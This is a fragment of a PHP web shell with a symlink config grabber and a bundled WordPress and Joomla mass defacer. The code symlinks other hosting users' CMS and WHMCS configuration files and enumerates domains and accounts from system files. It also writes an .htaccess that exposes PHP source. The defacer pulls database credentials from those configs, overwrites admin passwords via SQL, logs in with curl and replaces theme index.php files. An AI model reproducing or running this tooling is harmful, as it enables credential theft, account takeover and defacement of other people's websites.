		symlink('/home6/'.$usern.'/public_html/includes/config.php',$pdomain.'~~vBulletin2.txt');
		symlink('/home6/'.$usern.'/public_html/forum/includes/config.php',$pdomain.'~~vBulletin3.txt');
		symlink('/home6/'.$usern.'/public_html/cc/includes/config.php',$pdomain.'~~vBulletin4.txt');
		symlink('/home6/'.$usern.'/public_html/config.php',$pdomain.'~~Phpbb1.txt');
		symlink('/home6/'.$usern.'/public_html/forum/includes/config.php',$pdomain.'~~Phpbb2.txt');
		symlink('/home6/'.$usern.'/public_html/wp-config.php',$pdomain.'~~Wordpress1.txt');
		symlink('/home6/'.$usern.'/public_html/blog/wp-config.php',$pdomain.'~~Wordpress2.txt');
		symlink('/home6/'.$usern.'/public_html/configuration.php',$pdomain.'~~Joomla1.txt');
		symlink('/home6/'.$usern.'/public_html/blog/configuration.php',$pdomain.'~~Joomla2.txt');
		symlink('/home6/'.$usern.'/public_html/joomla/configuration.php',$pdomain.'~~Joomla3.txt');
		symlink('/home6/'.$usern.'/public_html/whm/configuration.php',$pdomain.'~~Whm1.txt');
		symlink('/home6/'.$usern.'/public_html/whmc/configuration.php',$pdomain.'~~Whm2.txt');
		symlink('/home6/'.$usern.'/public_html/support/configuration.php',$pdomain.'~~Whm3.txt');
		symlink('/home6/'.$usern.'/public_html/client/configuration.php',$pdomain.'~~Whm4.txt');
		symlink('/home6/'.$usern.'/public_html/billings/configuration.php',$pdomain.'~~Whm5.txt');
		symlink('/home6/'.$usern.'/public_html/billing/configuration.php',$pdomain.'~~Whm6.txt');
		symlink('/home6/'.$usern.'/public_html/clients/configuration.php',$pdomain.'~~Whm7.txt');
		symlink('/home6/'.$usern.'/public_html/whmcs/configuration.php',$pdomain.'~~Whm8.txt');
		symlink('/home6/'.$usern.'/public_html/order/configuration.php',$pdomain.'~~Whm9.txt');
		symlink('/home6/'.$usern.'/public_html/admin/conf.php',$pdomain.'~~5.txt');
		symlink('/home6/'.$usern.'/public_html/admin/config.php',$pdomain.'~~4.txt');
		symlink('/home6/'.$usern.'/public_html/conf_global.php',$pdomain.'~~invisio.txt');
		symlink('/home6/'.$usern.'/public_html/include/db.php',$pdomain.'~~7.txt');
		symlink('/home6/'.$usern.'/public_html/connect.php',$pdomain.'~~8.txt');
		symlink('/home6/'.$usern.'/public_html/mk_conf.php',$pdomain.'~~mk-portale1.txt');
		symlink('/home6/'.$usern.'/public_html/include/config.php',$pdomain.'~~12.txt');
		symlink('/home6/'.$usern.'/public_html/settings.php',$pdomain.'~~Smf.txt');
		symlink('/home6/'.$usern.'/public_html/includes/functions.php',$pdomain.'~~phpbb3.txt');
		symlink('/home6/'.$usern.'/public_html/include/db.php',$pdomain.'~~infinity.txt');
		symlink('/home7/'.$usern.'/public_html/vb/includes/config.php',$pdomain.'~~vBulletin1.txt');
		symlink('/home7/'.$usern.'/public_html/includes/config.php',$pdomain.'~~vBulletin2.txt');
		symlink('/home7/'.$usern.'/public_html/forum/includes/config.php',$pdomain.'~~vBulletin3.txt');
		symlink('/home7/'.$usern.'/public_html/cc/includes/config.php',$pdomain.'~~vBulletin4.txt');
		symlink('/home7/'.$usern.'/public_html/config.php',$pdomain.'~~Phpbb1.txt');
		symlink('/home7/'.$usern.'/public_html/forum/includes/config.php',$pdomain.'~~Phpbb2.txt');
		symlink('/home7/'.$usern.'/public_html/wp-config.php',$pdomain.'~~Wordpress1.txt');
		symlink('/home7/'.$usern.'/public_html/blog/wp-config.php',$pdomain.'~~Wordpress2.txt');
		symlink('/home7/'.$usern.'/public_html/configuration.php',$pdomain.'~~Joomla1.txt');
		symlink('/home7/'.$usern.'/public_html/blog/configuration.php',$pdomain.'~~Joomla2.txt');
		symlink('/home7/'.$usern.'/public_html/joomla/configuration.php',$pdomain.'~~Joomla3.txt');
		symlink('/home7/'.$usern.'/public_html/whm/configuration.php',$pdomain.'~~Whm1.txt');
		symlink('/home7/'.$usern.'/public_html/whmc/configuration.php',$pdomain.'~~Whm2.txt');
		symlink('/home7/'.$usern.'/public_html/support/configuration.php',$pdomain.'~~Whm3.txt');
		symlink('/home7/'.$usern.'/public_html/client/configuration.php',$pdomain.'~~Whm4.txt');
		symlink('/home7/'.$usern.'/public_html/billings/configuration.php',$pdomain.'~~Whm5.txt');
		symlink('/home7/'.$usern.'/public_html/billing/configuration.php',$pdomain.'~~Whm6.txt');
		symlink('/home7/'.$usern.'/public_html/clients/configuration.php',$pdomain.'~~Whm7.txt');
		symlink('/home7/'.$usern.'/public_html/whmcs/configuration.php',$pdomain.'~~Whm8.txt');
		symlink('/home7/'.$usern.'/public_html/order/configuration.php',$pdomain.'~~Whm9.txt');
		symlink('/home7/'.$usern.'/public_html/admin/conf.php',$pdomain.'~~5.txt');
		symlink('/home7/'.$usern.'/public_html/admin/config.php',$pdomain.'~~4.txt');
		symlink('/home7/'.$usern.'/public_html/conf_global.php',$pdomain.'~~invisio.txt');
		symlink('/home7/'.$usern.'/public_html/include/db.php',$pdomain.'~~7.txt');
		symlink('/home7/'.$usern.'/public_html/connect.php',$pdomain.'~~8.txt');
		symlink('/home7/'.$usern.'/public_html/mk_conf.php',$pdomain.'~~mk-portale1.txt');
		symlink('/home7/'.$usern.'/public_html/include/config.php',$pdomain.'~~12.txt');
		symlink('/home7/'.$usern.'/public_html/settings.php',$pdomain.'~~Smf.txt');
		symlink('/home7/'.$usern.'/public_html/includes/functions.php',$pdomain.'~~phpbb3.txt');
		symlink('/home7/'.$usern.'/public_html/include/db.php',$pdomain.'~~infinity.txt');
	}

				$d0mains = @file("/etc/named.conf");
		
				if($d0mains)
				{
					mkdir($fn);
					chdir($fn);
										
					foreach($d0mains as $d0main)
					{
						if(eregi("zone",$d0main))
						{
							preg_match_all('#zone "(.*)"#', $d0main, $domains);
							flush();
								
							if(strlen(trim($domains[1][0])) > 2)
							{ 
								$user = posix_getpwuid(@fileowner("/etc/valiases/".$domains[1][0]));
								
								syml($user['name'],$domains[1][0]);					
							}
						}
					}
					echo "<center><font color=lime size=3>Done</font></center>";
					echo "<br><center><a href=$fn/ target=_blank><font size=3 color=#009900>Here</font></a></center>"; 
				}
				else
				{
					mkdir($fn);
					chdir($fn);
					$temp = "";
					$val1 = 0;
					$val2 = 1000;
					for(;$val1 <= $val2;$val1++) 
					{
						$uid = @posix_getpwuid($val1);
						if ($uid)
							$temp .= join(':',$uid)."\n";
					 }
					 echo '<br/>';
					 $temp = trim($temp);
					 
					 $file5 = fopen("test.txt","w");
					 fputs($file5,$temp);
					 fclose($file5);

$htaccess =
'T3B0aW9ucyBhbGwgCkRpcmVjdG9yeUluZGV4IHJlYWRtZS5odG1sIApBZGRUeXBlIHRleHQvcGxh
aW4gLnBocCAKQWRkSGFuZGxlciBzZXJ2ZXItcGFyc2VkIC5waHAgCkFkZFR5cGUgdGV4dC9wbGFp
biAuaHRtbCAKQWRkSGFuZGxlciB0eHQgLmh0bWwgClJlcXVpcmUgTm9uZSAKU2F0aXNmeSBBbnk=
';
$file = fopen(".htaccess","w+");
$write = fwrite ($file ,base64_decode($htaccess));
					 
					 $file = fopen("test.txt", "r") or exit("Unable to open file!");
					 while(!feof($file))
					 {
						$s = fgets($file);
						$matches = array();
						$t = preg_match('/\/(.*?)\:\//s', $s, $matches);
						$matches = str_replace("home/","",$matches[1]);
						if(strlen($matches) > 12 || strlen($matches) == 0 || $matches == "bin" || $matches == "etc/X11/fs" || $matches == "var/lib/nfs" || $matches == "var/arpwatch" || $matches == "var/gopher" || $matches == "sbin" || $matches == "var/adm" || $matches == "usr/games" || $matches == "var/ftp" || $matches == "etc/ntp" || $matches == "var/www" || $matches == "var/named")
							continue;
						syml($matches,$matches);
					 }
					fclose($file);
					echo "</table>";
					unlink("test.txt");
					echo "<center><font color=lime size=3>Done</font></center>";
					echo "<br><center><a href=$fn/ target=_blank><font size=3 color=#009900>Here</font></a></center>"; 
				}
echo "<hr><center><b><a href=".$_SERVER['PHP_SELF'].">BACK</a>";
exit;
}
?>
<form method="POST" target="_blank">
<input name="page" type="hidden" value="find">
	<table border=1>
	<body bgcolor="white" text="black"><br><br>
    

    <tr>
    <td>
	<strong>User :</strong>
	</td>
	<td>
	<strong><textarea cols="79" style="background:white;outline:none;color:black;" rows="10" name="usernames"><?php system('ls /var/mail');?></textarea></strong>
    </td>
    <tr>
    <td>
	<strong>Pass :</strong>
	</td>
	<td>
    <strong><textarea cols="79" style="background:white;outline:none;color:black;" rows="10" name="passwords"></textarea></strong>
	</td>
    </tr>
    <tr>
    <td>
	<strong>Type :</strong>
	</td>
    <td>
    <span style="background:white;outline:none;color:black;"><strong>Simple : </strong> </span>
	<strong>
	<input type="radio" name="type" value="simple" checked="checked" class="style3"></strong><br>
    <font style="background:white;outline:none;color:black;"><strong>/etc/passwd : </strong> </font>
	<strong>
	<input type="radio" name="type" value="passwd" style="background:white;outline:none;color:black;"></strong><span class="style3"><strong>
	</strong>
	</span>
    <td style="background:black;outline:none;color:white;"  >
    <strong><input class ='inputzbut' type="submit" value="START"></strong>
    </td>
    </tr>
	</table>
	<br>
	<table border=1>
    <tr> 
    <td valign="top" style="background:black;outline:none;color:gold;" >
		<strong>Get Config</strong>
		<br>
		<form method="POST" target="_blank">
	<strong>
<input name="mendapatkan" type="hidden" value="passwd" >        				
    </strong>
    <strong>Folder Name :</strong>
			<td>
				
	<strong><input style="background:white;outline:none;color:black;" size="80" name="foldername" type="text"></strong>
    <td style="background:black;outline:none;color:white;"  >
		<strong><input class ='inputzbut' type="submit" value="GO">
    </strong>
    </td>
    <tr>
</form>   
<tr>
    <td style="background:black;outline:none;color:gold;">
		<strong>Get Wordlist</strong>
<form method="POST" target="_blank">
	<strong>
<input name="pass" type="hidden" value="password">        				
    </strong>
    <strong>Url Config :</strong>
	<td>
		
    <strong>
		<input style="background:white;outline:none;color:black;" size="80" name="url" type="text"></strong>
	
    <td style="background:black;outline:none;color:white;"><strong><input class ='inputzbut' type="submit" value="GO">
    </strong>
    </td>
    <tr>
	<td style="background:black;outline:none;color:gold;" colspan="6">
	<strong>Info Security</strong></td>
    				</tr>
    <tr>
    <td style="background:black;outline:none;color:gold;" style="width: 139px"><strong>Safe Mode</strong></td>
    <td style="background:black;outline:none;color:gold;" colspan="5">
	<strong>
<?php
$safe_mode = ini_get('safe_mode');
if($safe_mode=='1')
{
echo 'ON';
}else{
echo 'OFF';
}

?>	
	</strong>	
	</td>
    </tr>
    <tr>
    <td style="background:white;outline:none;color:black;" style="width: 139px"><strong>DF</strong></td>
    <td style="background:white;outline:none;color:black;" colspan="5">
	<strong>
<form method="POST" target="_blank">
	<strong>
<input name="matikan" type="hidden" value="sekatan">        				
    </strong>
	

<?php
if(''==($func=@ini_get('disable_functions')))
{
echo "<center><font color=black>No Security for Function</font></b></center>";
}else{
echo '<script>alert("Please see below and press >Please Click Here First!<");</script>';
echo "<font color=red>$func</font></b>";
echo '<tr><td style="background:white;outline:none;color:black;" style="width: 139px"></td>';
echo '<td style="background:white;outline:none;color:black;"" colspan="5">
<strong><input type="submit" value="Please Click Here First!"></input>
    </strong>
    </td></tr>';
}
echo"</td></tr></table><br>";
	echo"<font color=gold>";
	
	echo"</font>";
}
elseif(isset($_GET['indx'])){
		echo"<font size='6' color='red'>
#JoomsWP
</font><p>";
error_reporting(0);
/*
Wordpress & Joomla Mass Defacer V2
Coded By k2ll33d ( ReZK2LL )
facebook : /k2ll33d
 
this version uses two methods for getting sites & users & config file
[+] the first method is getting everything about the domain from ( /etc/named.conf ) , and defacing
[+] the second method is getting sites names from ( /var/named ) , then collecting usernames nad defacing
 
don't worry about the base64 encryption in lines 20 and 25 , just the style , and the script name
you can decode and check them if you don't trust me ;)
*/
echo '<center><h2>Jommla & Wordpress Mass Defacer V2 by K2ll33d</h2>';
$base_url = 'http://'.$_SERVER['SERVER_NAME'].dirname($_SERVER['SCRIPT_NAME']);
 
// getting info from inside :)
function tunisia($text,$bideya,$niheya,$i=1){
    $ar0=explode($bideya, $text);
    $ar1=explode($niheya, $ar0[$i]);
    return trim($ar1[0]);
}
 
function randomt() {
    $chars = "abcdefghijkmnopqrstuvwxyz023456789";
    srand((double)microtime()*1000000);
    $i = 0;
    $pass = '';
    while ($i <= 7) {
        $num = rand() % 33;
        $tmp = substr($chars, $num, 1);
        $pass = $pass . $tmp;
        $i++;
    }
    return $pass;
}
 
// joomla index changer
function index_changer_joomla($conf, $content, $domain) {
    $doler = '$';
    $username = tunisia($conf, $doler."user = '", "';");
    $password = tunisia($conf, $doler."password = '", "';");
    $dbname = tunisia($conf, $doler."db = '", "';");
    $prefix = tunisia($conf, $doler."dbprefix = '", "';");
    $host = tunisia($conf, $doler."host = '","';");
    $co=randomt();
    $site_url = "http://".$domain."/administrator";
    $output = '';
    $cond = 0;
    $link=mysql_connect($host, $username, $password);
    if($link) {
        mysql_select_db($dbname,$link) ;
        $req1 = mysql_query("UPDATE `".$prefix."users` SET `username` ='admin' , `password` = '4297f44b13955235245b2497399d7a93', `usertype` = 'Super Administrator', `block` = 0");
        $req = mysql_numrows(mysql_query("SHOW TABLES LIKE '".$prefix."extensions'"));
    } else {
        $output.= "[-] DB Error<br />";
    }
   
    if($req1){
        if ($req) {
$req = mysql_query("SELECT * from  `".$prefix."template_styles` WHERE `client_id` = '0' and `home` = '1'");
$data = mysql_fetch_array($req);
$template_name = $data["template"];
 
$req = mysql_query("SELECT * from  `".$prefix."extensions` WHERE `name`='".$template_name."' or `element` = '".$template_name."'");
$data = mysql_fetch_array($req);
$template_id = $data["extension_id"];
 
$url2=$site_url."/index.php";
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $url2);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_USERAGENT, $useragent);
curl_setopt($ch, CURLOPT_COOKIEJAR, $co);
curl_setopt($ch, CURLOPT_COOKIEFILE, $co);
$buffer = curl_exec($ch);
$return = tunisia($buffer ,'<input type="hidden" name="return" value="','"');
$hidden = tunisia($buffer ,'<input type="hidden" name="','" value="1"',4);
 
if($return && $hidden) {
curl_setopt($ch, CURLOPT_URL, $url2);
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_REFERER, $url2);
curl_setopt($ch, CURLOPT_POSTFIELDS, "username=admin&passwd=123123&option=com_login&task=login&return=".$return."&".$hidden."=1");
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_USERAGENT, $useragent);
curl_setopt($ch, CURLOPT_COOKIEJAR, $co);
curl_setopt($ch, CURLOPT_COOKIEFILE, $co);
$buffer = curl_exec($ch);
$pos = strpos($buffer,"com_config");
if($pos === false) {
$output.= "[-] Login Error<br />";
} else {
$output.= "[+] Login Successful<br />";
}
}
if($pos){
$url2=$site_url."/index.php?option=com_templates&task=source.edit&id=".base64_encode($template_id.":index.php");
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $url2);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_USERAGENT, $useragent);
curl_setopt($ch, CURLOPT_COOKIEJAR, $co);
curl_setopt($ch, CURLOPT_COOKIEFILE, $co);
$buffer = curl_exec($ch);
 
$hidden2=tunisia($buffer ,'<input type="hidden" name="','" value="1"',2);
if($hidden2) {
$output.= "[+] index.php file found in Theme Editor<br />";
} else {
$output.= "[-] index.php Not found in Theme Editor<br />";
}
}
if($hidden2) {
$url2=$site_url."/index.php?option=com_templates&layout=edit";
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $url2);
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS,"jform[source]=".$content."&jform[filename]=index.php&jform[extension_id]=".$template_id."&".$hidden2."=1&task=source.save");
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_USERAGENT, $useragent);
curl_setopt($ch, CURLOPT_COOKIEJAR, $co);
curl_setopt($ch, CURLOPT_COOKIEFILE, $co);
$buffer = curl_exec($ch);
curl_close($ch);
 
$pos = strpos($buffer,'<dd class="message message">');
$cond = 0;
if($pos === false) {
$output.= "[-] Updating Index.php Error<br />";
   
} else {
$output.= "[+] Index.php Template successfully saved<br />";
$cond = 1;
}
}
        }
        else {
$req =mysql_query("SELECT * from  `".$prefix."templates_menu` WHERE client_id='0'");
$data = mysql_fetch_array($req);
$template_name=$data["template"];
$useragent="Mozilla/4.0 (compatible; MSIE 7.0b; Windows NT 5.1; .NET CLR 1.1.4322; Alexa Toolbar; .NET CLR 2.0.50727)";
$url2=$site_url."/index.php";
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $url2);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 10);
curl_setopt($ch, CURLOPT_USERAGENT, $useragent);
curl_setopt($ch, CURLOPT_COOKIEJAR, $co);
curl_setopt($ch, CURLOPT_COOKIEFILE, $co);
$buffer = curl_exec($ch);
$hidden=tunisia($buffer ,'<input type="hidden" name="','" value="1"',3);
 
if($hidden) {
curl_setopt($ch, CURLOPT_URL, $url2);
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS,"username=admin&passwd=123456&option=com_login&task=login&".$hidden."=1");
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_USERAGENT, $useragent);
curl_setopt($ch, CURLOPT_COOKIEJAR, $co);
curl_setopt($ch, CURLOPT_COOKIEFILE, $co);
$buffer = curl_exec($ch);
$pos = strpos($buffer,"com_config");
if($pos === false) {
$output.= "[-] Login Error<br />";
} else {
$output.= "[+] Login Successful<br />";
}
}
 
if($pos) {
$url2=$site_url."/index.php?option=com_templates&task=edit_source&client=0&id=".$template_name;
curl_setopt($ch, CURLOPT_URL, $url2);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch,CURLOPT_RETURNTRANSFER,1);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_USERAGENT, $useragent);
curl_setopt($ch, CURLOPT_COOKIEJAR, $co);
curl_setopt($ch, CURLOPT_COOKIEFILE, $co);
$buffer = curl_exec($ch);
$hidden2=tunisia($buffer ,'<input type="hidden" name="','" value="1"',6);
if($hidden2) {
$output.= "[+] index.php file founded in Theme Editor<br />";
} else {
$output.= "[-] index.php Not found in Theme Editor<br />";
}
}
 
if($hidden2) {
$url2=$site_url."/index.php?option=com_templates&layout=edit";
curl_setopt($ch, CURLOPT_URL, $url2);
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS,"filecontent=".$content."&id=".$template_name."&cid[]=".$template_name."&".$hidden2."=1&task=save_source&client=0");
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch,CURLOPT_RETURNTRANSFER,1);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_USERAGENT, $useragent);
curl_setopt($ch, CURLOPT_COOKIEJAR, $co);
curl_setopt($ch, CURLOPT_COOKIEFILE, $co);
$buffer = curl_exec($ch);
curl_close($ch);
 
$pos = strpos($buffer,'<dd class="message message fade">');
$cond = 0;
if($pos === false) {
$output.= "[-] Updating Index.php Error<br />";
} else {
$output.= "[+] Index.php Template successfully saved<br />";
$cond = 1;
}
}
        }
    } else {
        $output.= "[-] DB Error<br />";
    }
    global $base_path;
    unlink($base_path.$co);
    return array('cond'=>$cond, 'output'=>$output , 'template'=>$template_name);
}
 
 
// wordpress index changer
 
function index_changer_wp($conf, $index) {
$dol = '$';
$preindex = "<?php
".$dol."def = file_get_contents('".$index."');
".$dol."p = explode('public_html',dirname(__FILE__));
".$dol."p = ".$dol."p[0].'public_html';
if (".$dol."handle = opendir(".$dol."p)) {
   ".$dol."p1 = @fopen(".$dol."p.'/index.html','w+');
   @fwrite(".$dol."fp1, ".$dol."def);
   ".$dol."p1 = @fopen(".$dol."p.'/index.php','w+');
   @fwrite(".$dol."fp1, ".$dol."def);
   ".$dol."fp1 = @fopen(".$dol."p.'/index.htm','w+');
   @fwrite(".$dol."fp1, ".$dol."def);
   echo 'Done';
}
closedir(".$dol."handle);
unlink(__FILE__);
?>";
$content = base64_encode($preindex);
    $output = '';
    $dol = '$';
    $go = 0;
    $username = tunisia($conf,"define('DB_USER', '","');");
    $password = tunisia($conf,"define('DB_PASSWORD', '","');");
    $dbname = tunisia($conf,"define('DB_NAME', '","');");
    $prefix = tunisia($conf,$dol."table_prefix  = '","'");
    $host = tunisia($conf,"define('DB_HOST', '","');");
 
    $link=mysql_connect($host,$username,$password);
    if($link) {
        mysql_select_db($dbname,$link) ;
        $dol = '$';
        $req1 = mysql_query("UPDATE `".$prefix."users` SET `user_login` = 'admin',`user_pass` = '4297f44b13955235245b2497399d7a93' WHERE `ID` = 1");
    } else {
        $output.= "[-] DB Error<br />";
    }
    if($req1) {
 
        $req = mysql_query("SELECT * from  `".$prefix."options` WHERE option_name='home'");
        $data = mysql_fetch_array($req);
        $site_url=$data["option_value"];
 
        $req = mysql_query("SELECT * from  `".$prefix."options` WHERE option_name='template'");
        $data = mysql_fetch_array($req);
        $template = $data["option_value"];
 
        $req = mysql_query("SELECT * from  `".$prefix."options` WHERE option_name='current_theme'");
        $data = mysql_fetch_array($req);
        $current_theme = $data["option_value"];
 
        $useragent="Mozilla/4.0 (compatible; MSIE 7.0b; Windows NT 5.1; .NET CLR 1.1.4322; Alexa Toolbar; .NET CLR 2.0.50727)";
        $url2=$site_url."/wp-login.php";
 
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $url2);
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS,"log=admin&pwd=123123&rememberme=forever&wp-submit=Log In&testcookie=1");
        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER,1);
        curl_setopt($ch, CURLOPT_HEADER, 0);
        curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 10);
        curl_setopt($ch, CURLOPT_USERAGENT, $useragent);
        curl_setopt($ch, CURLOPT_COOKIEJAR, "COOKIE.txt");
        curl_setopt($ch, CURLOPT_COOKIEFILE, "COOKIE.txt");
        $buffer = curl_exec($ch);
 
        $pos = strpos($buffer,"action=logout");
        if($pos === false) {
$output.= "[-] Login Error<br />";
        } else {
$output.= "[+] Login Successful<br />";
$go = 1;
        }
        if($go) {
$cond = 0;
$url2=$site_url."/wp-admin/theme-editor.php?file=/themes/".$template.'/index.php&theme='.urlencode($current_theme).'&dir=theme';
curl_setopt($ch, CURLOPT_URL, $url2);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 0);
curl_setopt($ch, CURLOPT_RETURNTRANSFER,1);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_USERAGENT, $useragent);
curl_setopt($ch, CURLOPT_COOKIEJAR, "COOKIE.txt");
curl_setopt($ch, CURLOPT_COOKIEFILE, "COOKIE.txt");
$buffer0 = curl_exec($ch);
 
$_wpnonce = tunisia($buffer0,'<input type="hidden" id="_wpnonce" name="_wpnonce" value="','" />');
$_file = tunisia($buffer0,'<input type="hidden" name="file" value="','" />');
 
if(substr_count($_file,"/index.php") != 0){
$output.= "[+] index.php loaded in Theme Editor<br />";
$url2=$site_url."/wp-admin/theme-editor.php";
curl_setopt($ch, CURLOPT_URL, $url2);
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS,"newcontent=".base64_decode($content)."&action=update&file=".$_file."&_wpnonce=".$_wpnonce."&submit=Update File");
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_USERAGENT, $useragent);
curl_setopt($ch, CURLOPT_COOKIEJAR, "COOKIE.txt");
curl_setopt($ch, CURLOPT_COOKIEFILE, "COOKIE.txt");
$buffer = curl_exec($ch);
curl_close($ch);
 
$pos = strpos($buffer,'<div id="message" class="updated">');
if($pos === false) {
$output.= "[-] Updating Index.php Error<br />";
} else {
$output.= "[+] Index.php Updated Successfuly<br />";
$hk = explode('public_html',$_file);
$output.= '[+] Deface '.file_get_contents($site_url.str_replace('/blog','',$hk[1]));
$cond = 1;
}
} else {
$url2=$site_url.'/wp-admin/theme-editor.php?file=index.php&theme='.$template;
curl_setopt($ch, CURLOPT_URL, $url2);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 0);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_USERAGENT, $useragent);
curl_setopt($ch, CURLOPT_COOKIEJAR, "COOKIE.txt");
curl_setopt($ch, CURLOPT_COOKIEFILE, "COOKIE.txt");
$buffer0 = curl_exec($ch);
 
$_wpnonce = tunisia($buffer0,'<input type="hidden" id="_wpnonce" name="_wpnonce" value="','" />');
$_file = tunisia($buffer0,'<input type="hidden" name="file" value="','" />');
 
if(substr_count($_file,"index.php") != 0){
$output.= "[+] index.php loaded in Theme Editor<br />";
$url2=$site_url."/wp-admin/theme-editor.php";
curl_setopt($ch, CURLOPT_URL, $url2);
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS,"newcontent=".base64_decode($content)."&action=update&file=".$_file."&theme=".$template."&_wpnonce=".$_wpnonce."&submit=Update File");
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_USERAGENT, $useragent);
curl_setopt($ch, CURLOPT_COOKIEJAR, "COOKIE.txt");
curl_setopt($ch, CURLOPT_COOKIEFILE, "COOKIE.txt");
$buffer = curl_exec($ch);
curl_close($ch);
 
$pos = strpos($buffer,'<div id="message" class="updated">');
if($pos === false) {
    $output.= "[-] Updating Index.php Error<br />";
} else {
    $output.= "[+] Index.php Template Updated Successfuly<br />";
        $output.= '[+] Deface '.file_get_contents($site_url.'/wp-content/themes/'.$template.'/index.php');
    $cond = 1;
}
} else {
$output.= "[-] index.php can not load in Theme Editor<br />";
}
}
        }
    } else {
        $output.= "[-] DB Error<br />";
    }
    global $base_path;
    unlink($base_path.'COOKIE.txt');
    return array('cond'=>$cond, 'output'=>$output , 'template'=> $template);
}
 
if($_POST['mode']==2) {
// symlinking
@mkdir('sym',0777);
$htaccess  = "Options all \n DirectoryIndex Sux.html \n AddType text/plain .php \n AddHandler server-parsed .php \n AddType text/plain .html \n AddHandler txt .html \n Require None \n Satisfy Any";
file_put_contents("sym/.htaccess",$htaccess);
@symlink('/','sym/root');
 
 
// getting sites from (/var/named) file
$named=file_get_contents($base_url.'/sym/root/var/named/');
$ar = explode('<li><a href="', $named);
for($vi=2;$vi < count($ar);$vi++)
     {
$var1 = strtok($ar[$vi], " ");
$var1 = substr($var1,0,-2);
$old=('.db');
$new=('');
$sites = str_replace($old , $new , $var1);
file_put_contents('sites.txt',$sites);
}
 
// getting usernames
$domains=file('sites.txt');
foreach ($domains as $domain) {
$order=("ls -la /etc/valiases/".$domain);
$exec=exec($order);
$filename = 'mail.txt';
$fp = fopen($filename, "a+");
$write = fputs($fp, $exec."\n");
fclose($fp);
}
 
$mail=file('mail.txt');
foreach ($mail as $finaldom) {
$user=tunisia($finaldom,"-rw-r----- 1 "," mail");
$site=substr(strstr($finaldom, '/etc/valiases'),14);
 
$filename = 'userdom.txt';
$fp = fopen($filename, "a+");
$write = fputs($fp, $user.":". $site." ");
fclose($fp);
 
}
 
$f=file_get_contents('userdom.txt');
$finals=explode(" ",$f);
foreach ($finals as $final){
$strlen=('6');
$dr=strlen ($final);
if ($dr < $strlen) {
$filename = 'fail.txt';
$fp = fopen($filename, "a");
$write = fputs($fp, $final);
fclose($fp);
}
else {
$filename = 'success.txt';
$fp = fopen($filename, "a");
$write = fputs($fp, $final."\n");
fclose($fp);
}
}
 
// now to work
$index=$_POST['tunisia'];
$url=($base_url);
$a=file($base_url.'/success.txt');
echo ("<center><table class='result' width='100%' border=1 cellspacing=1 cellpading=1>  
<tr><th width=50%>domain</td><th width=25%>Type</td><th width=25%>Status</td></tr>");
$khaled = fopen('defaced.html', 'a+');
foreach ($a as $final) {
list($user, $site_url) = explode(":", $final);
$site_urlto = substr($site_url, 0, -1);
// joomla symlinks
$joomla=$url."/sym/root/home/".$user."/public_html/configuration.php";
$joomla2=$url."/sym/root/home/".$user."/public_html/joomla/configuration.php";
$joomla3=$url."/sym/root/home/".$user."/public_html/site/configuration.php";
// wordpress symlinks
$wordpress=$url."/sym/root/home/".$user."/public_html/wp-config.php";
$wordpress2=$url."/sym/root/home/".$user."/public_html/blog/wp-config.php";
